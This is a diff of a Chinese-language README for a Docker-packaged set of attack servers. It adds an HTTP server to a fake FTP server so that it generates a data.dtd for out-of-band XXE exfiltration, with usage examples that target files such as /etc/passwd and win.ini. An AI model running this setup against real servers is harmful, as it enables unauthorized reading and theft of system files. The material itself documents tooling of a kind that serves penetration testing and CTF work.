@@ -34,11 +34,19 @@ python3 xxe-smb-server.py public-ip-address [web-port] [-s share-path]
 - 一个简易的假 FTP 服务器，模拟 vsFTPd 3.0.3。
 - 支持处理 `USER` / `PASS` / `PWD` / `CWD` / `RETR` / `EPSV` 等常见命令。
 - 会记录所有收到的 `RETR` 路径（打印 + 可选写入日志文件），适合在一些场景中捕获/观察路径。
+- **新增**：内置 HTTP 服务器，动态生成 `data.dtd` 用于 XXE 攻击，自动配置服务器 IP、FTP 端口和目标文件路径。
 
 原始运行方式：
 
 ```bash
-python3 fake-ftp-server.py <port> [output_file]
+python3 fake-ftp-server.py <port> [选项]
+
+# 示例
+python3 fake-ftp-server.py 2121                           # 仅启动 FTP 服务器
+python3 fake-ftp-server.py 2121 -w 8080                   # 启动 FTP + HTTP 服务器
+python3 fake-ftp-server.py 2121 -w 8080 -f /etc/passwd    # 指定目标文件
+python3 fake-ftp-server.py 2121 -w 8080 --ip 1.2.3.4      # 指定公网 IP
+python3 fake-ftp-server.py 2121 -w 8080 -o data.log       # 保存捕获数据
 ```
 
 同样通过环境变量映射到容器内参数。
@@ -55,6 +63,8 @@ python3 fake-ftp-server.py <port> [output_file]
   `SimpleSMBServer` 的 SMB 端口（**TCP 445**）。
 - `FAKE_FTP_PORT`（默认 `2121`）  
   `fake-ftp-server.py` 的 FTP 监听端口。
+- `FAKE_FTP_HTTP_PORT`（默认 `8080`）  
+  `fake-ftp-server.py` 的 HTTP 服务器端口，用于提供 `data.dtd`。
 
 在提供的 `docker-compose.yml` 中示例映射为：
 
@@ -63,6 +73,7 @@ ports:
   - "8088:8088"   # HTTP (xxe-smb-server)
   - "445:445"     # SMB
   - "2121:2121"   # fake-ftp-server
+  - "8080:8080"   # HTTP (fake-ftp-server DTD)
 ```
 
 > 注意：宿主机的 445 端口可能已被系统或其他服务占用，必要时可以改成 `1445:445` 之类的映射。
@@ -99,7 +110,7 @@ python3 /app/xxe-smb-server/xxe-smb-server.py \
 
 ---
 
-### fake-ftp-server（路径 sniffer）
+### fake-ftp-server（路径 sniffer + HTTP DTD 服务器）
 
 - `FAKE_FTP_PORT`（必选，默认 `2121`）
 
@@ -110,14 +121,23 @@ python3 /app/xxe-smb-server/xxe-smb-server.py \
   如果设置，则所有捕获到的 `RETR` 路径会被追加写入该文件。  
   例如 `/var/log/ftp_paths.log`。
 
+- `FAKE_FTP_HTTP_PORT`（可选，默认 `8080`）
+
+  HTTP 服务器端口，用于提供 `data.dtd` 文件供 XXE payload 调用。
+
+- `FAKE_FTP_FILE_PATH`（可选，默认 `/etc/passwd`）
+
+  XXE 攻击时要读取的目标文件路径。  
+  Linux 系统可使用 `/etc/passwd`，Windows 系统可使用 `c:/windows/win.ini`。
+
 对应调用为：
 
 ```bash
-# 若设置了 FAKE_FTP_LOG_FILE
-python3 /app/fake-ftp-server/fake-ftp-server.py "${FAKE_FTP_PORT}" "${FAKE_FTP_LOG_FILE}"
-
-# 若未设置
-python3 /app/fake-ftp-server/fake-ftp-server.py "${FAKE_FTP_PORT}"
+python3 /app/fake-ftp-server/fake-ftp-server.py ${FAKE_FTP_PORT} \
+  --ip ${XXE_SMB_PUBLIC_IP} \
+  --http-port ${FAKE_FTP_HTTP_PORT} \
+  --file ${FAKE_FTP_FILE_PATH} \
+  [--output ${FAKE_FTP_LOG_FILE}]
 ```
 
 ---
